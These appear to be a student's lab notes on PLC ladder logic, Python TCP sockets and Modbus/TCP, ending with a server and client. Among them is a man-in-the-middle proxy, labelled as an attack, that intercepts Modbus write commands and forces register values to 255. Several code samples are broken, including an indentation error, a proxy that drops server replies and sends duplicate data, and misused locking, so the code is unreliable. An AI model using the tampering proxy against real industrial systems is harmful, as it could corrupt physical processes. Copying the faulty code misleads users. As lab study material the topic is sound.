Ladder logic:

purpose: take input process and give output 

instead of plc we had relay logic, this bridges the gap.

left-input and logic +ve rail
right-output -ve rail

flow of electricity 
contact flow - allows power like switch 
types of contact:
open contact - standard
closed contact 
positive edge - react when from flase to true
negative edge - react when from true to false

types of coil
coil - standard
negated coil closed
set coil when true it set something high but lose nothing
reset coil when false it sets something but get power it wont do anything
these both are both part of same thing


AND
OR
XOR
FUNCTION BLOCK
timer example 
https://realpython.com/python-sockets/#multi-connection-client-and-server
# Traffic Light
<img width="1920" height="920" alt="image" src="https://github.com/user-attachments/assets/79c7804c-6587-4cc1-b1bb-01243cdf2f1d" />
[https://app.plcsimulator.online/](https://app.plcsimulator.online/)

# SOCKET PROGRAMMING:
## Creating a socket object:
1. connecting two nodes of a network. one socket listens while other advertises
```
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
```
AF_NET is the address family, i.e tells the system how to find the destination, types:
1.AF_INET (IPv4)-32-bit addresses-192.168.1.1
2.AF_INET6 (IPv6)-newer version of IP addresses-2001:0db8:85a3...
3. AF_UNIX (Unix Domain Sockets)-Used for communication between two processes on the same machine.
SOCK_STREAM is the socket type,i.e tells the system how to send the data, which is specifically for the TCP protocol, Reliable, ordered, two-way, connection-based.

## Preparing for server to connect:
```server_address = ('localhost', 12345)```
This says the connection will be listent from local host(the computer) and 12345 will be the port that the client had to use to communicate with the server, and is the port the server listen to and lock on.
```sock.bind(server_address)```




# TCP SERVER
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = ('localhost', 12345)
sock.bind(server_address)
sock.listen(1)

print('Server started. Waiting for a connection...')
connection, client_address = sock.accept()

try:
    print('Connection from:', client_address)
    while True:
        data = connection.recv(1600)
        if data:
            text = data.decode('utf-8')
            print(f'Received: "{text}"')

            response = text + ' - this was the message received'
            connection.sendall(response.encode('utf-8'))
        else:
            break
finally:
    connection.close()
    sock.close()
```
# TCP CLIENT
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 12345)

print('Connecting to %s port %s' % server_address)
sock.connect(server_address)

try:
    message = "Hello World"
    print('Sending: "%s"' % message)
    sock.sendall(message.encode('utf-8'))

    data = sock.recv(1600)
    print('Received from server: "%s"' % data.decode('utf-8'))
finally:
    print('Closing client')
    sock.close()
```
# TCP SERVER MULTIPLE
```
import socket
from _thread import start_new_thread
import threading

lock = threading.Lock()

def handle_client(c):
    while True:
        data = c.recv(1024)
        if not data:
            print('Bye')
            lock.release()
            break
        c.send(data[::-1])
    c.close()

def main():
    host = ''
    port = 12345
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print("Server running on port", port)

    while True:
        c, addr = s.accept()
        lock.acquire()
        print('Connected to:', addr[0], ':', addr[1])
        start_new_thread(handle_client, (c,))

if __name__ == '__main__':
    main()
```



    
# TCP CLIENT MULTIPLE
```
import socket

def main():
    host = '127.0.0.1'
    port = 12345

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    msg = "hello from client"
    while True:
        s.send(msg.encode('ascii'))
        data = s.recv(1024)
        print('Received from server:', data.decode('ascii'))

        ans = input('Do you want to continue (y/n): ')
        if ans.lower() != 'y':
            break

    s.close()

if __name__ == '__main__':
    main()
```

# TCP MODBUS SERVER
```
#!/bin/python
from pyModbusTCP.server import ModbusServer
from time import sleep
from random import uniform

# Create an instance of ModbusServer
server = ModbusServer("127.0.0.1", 12345, no_block=True)

try:
    print("Start server...")
    server.start()
    print("Server is online")
    
    # Initialize state with a list containing 0 (Modbus words are always lists)
    state = [0]
    
    while True:
        # NEW WAY: Use server.data_bank instead of the global DataBank class
        # Writing a random value to Holding Register 0
        server.data_bank.set_holding_registers(0, [int(uniform(0, 100))])

        # Reading Holding Register 1
        current_reg1 = server.data_bank.get_holding_registers(1)

        # Check if current_reg1 exists and has changed
        if current_reg1 is not None and state != current_reg1:
            state = current_reg1
            print(f"Value of Register 1 has changed to {state}")

        sleep(0.5)

except KeyboardInterrupt:
    print("\nShutdown server ...")
    server.stop()
    print("Server is offline")
```
```
import socket
import threading
# Configuration
LOCAL_PORT = 9999        # The port the Client connects to
TARGET_IP = "127.0.0.1"  # The real Server IP
TARGET_PORT = 12345      # The real Server Port

def handle_client(client_socket):
    # Connect to the real Modbus Server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((TARGET_IP, TARGET_PORT))

    # Thread to move data from Server back to Client
    def server_to_client():
        while True:
            data = server_socket.recv(4096)
            if not data: break
    threading.Thread(target=server_to_client, daemon=True).start()

    # Main loop to move data from Client to Server
    while True:
        data = client_socket.recv(4096)
        if not data: break

        modified_data = bytearray(data)

        # Check for Function Code 06 (Write Single Register)
        if len(modified_data) == 12 and modified_data[7] == 0x06:
            # Force the value to 255 (0x00ff)
            modified_data[10:12] = b'\x00\xff' 
            print(f"[*] ATTACK: Modified FC06 value to 255")

        print(f"[*] Intercepted Client Data: {data.hex()}")

        # CRITICAL CHANGE: Send the MODIFIED data, not the original data
        server_socket.send(modified_data)
        # MITM Modification Example:
        # If we see a specific pattern, we could replace it here.
        server_socket.send(data)
   client_socket.close()
    server_socket.close()

def start_proxy():
    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy.bind(("0.0.0.0", LOCAL_PORT))
    proxy.listen(5)
    print(f"[*] MITM Proxy listening on port {LOCAL_PORT}...")

    while True:
        client_sock, addr = proxy.accept()
        print(f"[*] Connection from {addr}")
        threading.Thread(target=handle_client, args=(client_sock,)).start()

if __name__ == "__main__":
    start_proxy()





# TCP MODBUS CLIENT
```                           
from pyModbusTCP.client import ModbusClient
client= ModbusClient(host="127.0.0.1",port=12345,unit_id=1, auto_open=True)
regs = client.read_holding_registers(0, 2)
regs1 = client.read_holding_registers(10,2)
if regs:

    print(regs)
else:
    print("read error")

if client.write_multiple_registers(10, [44,55]):
    print("write ok")
else:
    print("write error")

if regs1:
        print(regs1)
else:
        print("read error")
```
UDP: https://dl.acm.org/doi/pdf/10.1145/1409908.1409911
